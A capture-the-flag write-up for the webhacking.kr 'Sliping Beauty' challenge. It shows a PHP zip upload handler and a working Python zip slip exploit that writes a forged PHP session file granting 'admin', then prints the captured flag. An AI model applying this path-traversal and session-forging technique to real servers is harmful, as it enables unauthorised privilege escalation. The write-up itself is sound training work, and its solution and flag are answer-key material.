# Sliping Beauty    Zip Slip Attack

URL: [http://webhacking.kr:10015](http://webhacking.kr:10015)

![sliping-beauty-1.png](/assets/ctf/webhacking.kr/sliping-beauty-1.png)

```php
<?php
session_start();
if (!$_SESSION["uid"]) {
    $_SESSION["uid"] = "guest";
}
if ($_SESSION["uid"] == "admin") {
    include "/flag";
}
if ($_FILES["upload"]) {
    $path = $_FILES["upload"]["tmp_name"];
    $zip = new ZipArchive();
    if ($zip->open($_FILES["upload"]["tmp_name"]) === true) {
        for ($i = 0; $i < $zip->numFiles; $i++) {
            $filename = $zip->getNameIndex($i);
            $filename_ = $filename . rand(10000000, 99999999);
            if (strlen($filename) > 240) {
                exit("file name too long");
            }
            if (preg_match('/[\x00-\x1F\x7F-\xFF]/', $filename)) {
                exit("no hack");
            }
            if (
                copy(
                    "zip://{$_FILES["upload"]["tmp_name"]}#{$filename}",
                    "./upload/{$filename_}"
                )
            ) {
                echo "{$filename_} uploaded.<br>";
            } else {
                echo "{$filename_} upload failed.<br>";
            }
        }
        $zip->close();
    }
}
highlight_file(__FILE__);
?>
```

My initial  thought about `zip://` protocol was RCE via LFI, but that hypothesis quickly came to an end. 

The filename restriction is be non-ascii characters are disallowed:
```python
>>> ', '.join(chr(c) for c in range(0x00, 0x1F))
'\x00, \x01, \x02, \x03, \x04, \x05, \x06, \x07, \x08, \t, \n, \x0b, \x0c, \r, \x0e, \x0f, \x10, \x11, \x12, \x13, \x14, \x15, \x16, \x17, \x18, \x19, \x1a, \x1b, \x1c, \x1d, \x1e'
>>> ', '.join(chr(c) for c in range(0x7F, 0xFF))
'\x7f, \x80, \x81, \x82, \x83, \x84, \x85, \x86, \x87, \x88, \x89, \x8a, \x8b, \x8c, \x8d, \x8e, \x8f, \x90, \x91, \x92, \x93, \x94, \x95, \x96, \x97, \x98, \x99, \x9a, \x9b, \x9c, \x9d, \x9e, \x9f, \xa0, ¡, ¢, £, ¤, ¥, ¦, §, ¨, ©, ª, «, ¬, \xad, ®, ¯, °, ±, ², ³, ´, µ, ¶, ·, ¸, ¹, º, », ¼, ½, ¾, ¿, À, Á, Â, Ã, Ä, Å, Æ, Ç, È, É, Ê, Ë, Ì, Í, Î, Ï, Ð, Ñ, Ò, Ó, Ô, Õ, Ö, ×, Ø, Ù, Ú, Û, Ü, Ý, Þ, ß, à, á, â, ã, ä, å, æ, ç, è, é, ê, ë, ì, í, î, ï, ð, ñ, ò, ó, ô, õ, ö, ÷, ø, ù, ú, û, ü, ý, þ'
```

![sliping-beauty.png](/assets/ctf/webhacking.kr/sliping-beauty.png)

The `$filename_ = $filename . rand(10000000, 99999999);` made this challenge a bit tricky, while we could update our own session, the random number at the end prevents us from doing that. Luckily we can create `sess_<RANDOM_NUMBER>` which is a session file meaning we can use that PHPSESSID later to preview the flag.

```python
import io
import zipfile
import requests
import re

URL = 'http://webhacking.kr:10015'
COOKIES = {'PHPSESSID': 'hi4uvai5sde90encr0ktq6879f'}

memory_file = io.BytesIO()
with zipfile.ZipFile(memory_file, 'w', zipfile.ZIP_DEFLATED) as f:
    f.writestr(f'../../../../../var/lib/php/sessions/sess_', 'uid|s:5:"admin";')

files = {'upload': ('letmein.zip', memory_file.getvalue(), 'application/zip')}
resp = requests.post(URL, files=files, cookies=COOKIES)
memory_file.close()

COOKIES['PHPSESSID'] = re.search(r'sess_(\d+)', resp.text).group(1)
resp = requests.get(URL, cookies=COOKIES)
flag = re.search(r'(FLAG\{.*\})', resp.text).group(1)
print(flag)
```

Essentially create a zip file which contains a file that can traverse path, place the file in `/var/lib/php/sessions` and the filename will be changed from `sess_` to `sess_<RANDOM_NUMBER>`, make a second request with that PHPSESSID to get flag.

```powershell
➜ py .\exploit.py
FLAG{my_zip_is_sliping_beauty}
```